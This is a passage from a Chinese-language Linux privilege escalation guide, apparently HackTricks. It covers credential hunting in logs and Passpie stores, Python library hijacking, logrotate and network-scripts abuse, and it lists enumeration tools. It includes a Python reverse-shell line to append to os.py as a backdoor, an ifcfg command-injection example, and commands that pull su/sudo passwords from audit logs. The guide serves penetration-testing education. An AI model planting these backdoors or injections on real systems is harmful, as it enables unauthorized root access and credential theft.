[Passpie 的默认数据库](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) 位于 `~/.passpie/`，其中包含 `.keys` keyring，以及按组目录存储的加密 `.pass` 凭据文件。能看到数据库目录只说明找到了一个路径线索：还需确认是否能访问密钥和相关加密条目、是否需要 master passphrase，以及恢复出的凭据是否属于权限更高的账户。Passpie 还支持[自定义数据库路径](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases)，因此默认路径并不全面。自动化枚举应仅列出元数据，不要导出凭据或打印密钥材料。

### 日志

如果你能读取日志，就可能在其中找到**有价值/机密的信息**。日志越奇怪，可能就越有价值。\
此外，某些配置“**不当**”（被植入后门？）的**审计日志**可能允许你将**密码记录**在审计日志中，详见这篇文章：[https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

为了**读取日志的组** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) 会非常有帮助。

### Shell 文件

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### 通用 Creds 搜索/Regex

你还应该检查文件名或文件内容中包含“**password**”一词的文件，也要检查日志中的 IP 和电子邮件地址，或使用哈希的正则表达式。\
这里就不逐一列出所有方法了；如果你感兴趣，可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后几项检查。

## 可写文件

### Python library hijacking

如果你知道 Python 脚本将从**哪个位置**执行，并且**可以写入**该文件夹，或者可以**修改 Python 库**，就可以修改 OS 库并植入后门（如果你可以写入 Python 脚本的执行位置，就复制并粘贴 os.py 库）。

要给库**植入后门**，只需在 os.py 库末尾添加以下代码行（更改 IP 和 PORT）：

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Logrotate 利用

当高权限 `logrotate` 任务实际轮转某个日志，而低权限用户能在轮转期间替换或重定向该日志所在目录时，就可能形成跨用户文件写入路径。仅仅发现日志可写只是一个线索。请确认当前生效的具体规则及其 `create`、`olddir` 和 `su` 指令；调度程序的有效身份；日志父目录的写入和搜索权限；以及已安装的构建版本和策略是否允许更改目标路径。若要通过写入启动文件实现命令执行，之后还必须有高权限 shell 加载生成的文件。请检查调度计划、规则、版本和打包信息，以及路径元数据；不要触发轮转或尝试 race。

> [!TIP]
> 不要将 `3.18.0` 或任何单独的版本字符串视为判断是否可利用的分界线。[上游变更日志](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md)记录了多个版本中的目录和 symlink 加固措施，发行版也可能回移修复。[上游手册](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in)建议在 root 轮转由非特权用户控制目录中的日志时使用 `su`；请核实实际生效的规则和行为。

有关此漏洞的更多详细信息，请参阅此页面：[https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。<sup>[[37]](#references)</sup>

你可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 利用此漏洞。

此漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **（nginx 日志）**非常相似，因此每当你发现自己可以更改日志时，请检查是谁在管理这些日志，并确认是否能用 symlink 替换日志来提升权限。

### /etc/sysconfig/network-scripts/（Centos/Redhat）

**漏洞参考：** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)。<sup>[[20]](#references)</sup>

当低权限用户可以创建或修改 `ifcfg-*` 文件，**并且**某个高权限网络激活路径会读取该确切文件时，该文件才是值得进一步检查的线索。请确认实际生效的文件和目录权限、所选接口、已安装的 `ifup`/`ifdown` 实现，以及调用它们的用户。仅仅文件可写并不会导致执行。[Red Hat 的 RHEL 7 网络指南](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files)区分了旧版 network scripts 和 NetworkManager：后者本身不会触发前者。[RHEL 8 文档](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking)说明，其默认的 `ifup`/`ifdown` 使用 NetworkManager，而可选的旧版软件包提供 shell scripts。

在实际使用高权限旧版 scripts 的系统上，未加引号、由 shell 读取的 `ifcfg-*` 赋值（例如 `NAME=`）可能跨越代码执行边界。请核实确切的解析器、值和激活路径；不要仅凭文件名或系统中存在 NetworkManager 就推断会进行 shell 解析。即使调用者无法直接编辑文件，若允许通过 sudo 使用的 wrapper 会将调用者输入写入 `ifcfg-*` 文件，然后调用旧版 `ifup`，这也是通往该边界的另一条路径。

例如：_/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

（_注意 Network 和 /bin/id 之间的空格_）

### **init、init.d、systemd 和 rc.d**

目录 `/etc/init.d` 是 System V init（SysVinit）**脚本**的存放位置。SysVinit 是 **经典的 Linux 服务管理系统**。其中包含用于 `start`、`stop`、`restart`，有时也用于 `reload` 服务的脚本。这些脚本可以直接执行，也可以通过 `/etc/rc?.d/` 中的符号链接执行。Redhat 系统中的另一个路径是 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 相关联。Upstart 是 Ubuntu 引入的较新**服务管理系统**，使用配置文件执行服务管理任务。尽管系统已转向 Upstart，但由于 Upstart 中的兼容层，SysVinit 脚本仍会与 Upstart 配置一起使用。

**systemd** 是一种现代的初始化和服务管理器，提供按需启动 daemon、automount 管理和系统状态快照等高级功能。它将发行版软件包的文件放在 `/usr/lib/systemd/` 中，并将管理员修改的文件放在 `/etc/systemd/system/` 中，从而简化系统管理流程。<sup>[[21]](#references)</sup>

## 其他技巧

### NFS 提权


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### 逃逸受限 Shell


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks：manager-channel 滥用

Android rooting frameworks 通常会 hook 一个 syscall，以便向 userspace manager 暴露特权内核功能。较弱的 manager 身份验证机制（例如基于 FD 顺序的签名检查或强度较低的密码方案）可能使本地应用冒充 manager，并在已 root 的设备上提权至 root。可在此了解更多信息和利用细节：


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## 通过基于 regex 的 exec 进行 VMware Tools 服务发现 LPE（CWE-426）（CVE-2025-41244）

VMware Tools/Aria Operations 中由 regex 驱动的服务发现功能可以从进程命令行中提取二进制文件路径，并在特权上下文中使用 `-v` 执行该文件。宽松的模式（例如使用 `\S`）可能匹配攻击者放在可写位置（例如 `/tmp/httpd`）的 listener，导致以 root 身份执行（CWE-426 不可信搜索路径）。<sup>[[27]](#references)</sup>

可在此了解更多信息，并查看适用于其他发现/监控堆栈的通用模式：

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## 内核安全防护

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 更多帮助

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc 工具

### **查找 Linux 本地提权向量的最佳工具：** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t 选项)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** 枚举 Linux 和 MAC 中的内核漏洞 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail（物理访问）：** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**更多脚本汇总**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning（Crontab UI 提权、复用 zip -P 凭据）](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era：伪造 .text_sig payload，供 cron 执行的 monitor 使用](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025：Neighborhood Watch 绕过（sudo env_keep PATH 劫持）](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Linux 基础提权](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux 提权指南](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [攻防：2016 年 Linux 提权技术](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [没人会想到命令执行！](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo（LD_PRELOAD）（Linux 提权）](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – 实验练习讲解 - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation：Linux 提权技巧](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i：Linux 枚举与提权工具](https://github.com/rtcrowley/linux-private-i)
- [14] [什么是 Socket？](https://www.linux.com/news/what-socket/)
- [15] [Peppo（Proving Grounds）解题记录](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [深入了解 D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux 提权](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo 第二部分 – Linux 提权](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [如何在 Linux 上管理 ACL](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [通过 network-scripts 获取 Redhat/CentOS root 权限](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [什么是 systemd？](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka（通过日志进行 bash 算术注入、完整攻击链）](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash 手册 – BASH_ENV（非交互式启动文件）](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment（sudo env_keep BASH_ENV → root）](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous（sudo terraform dev_overrides + TF_VAR 符号链接提权）](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik（pg_basebackup cron 复制 → SUID bash）](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – 你指定什么名称，VMware 就会提升什么权限（CVE-2025-41244）](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463：Sudo Chroot 权限提升](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 和 CVE-2025-32463 Sudo 权限提升漏洞](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC 存储库目录](https://peps.python.org/pep-3147/)
- [32] [Python importlib 文档](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [@paragonsec 发布的 Tweet](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - 在 Linux 上记录密码](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Logrotate 竞态条件详解](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
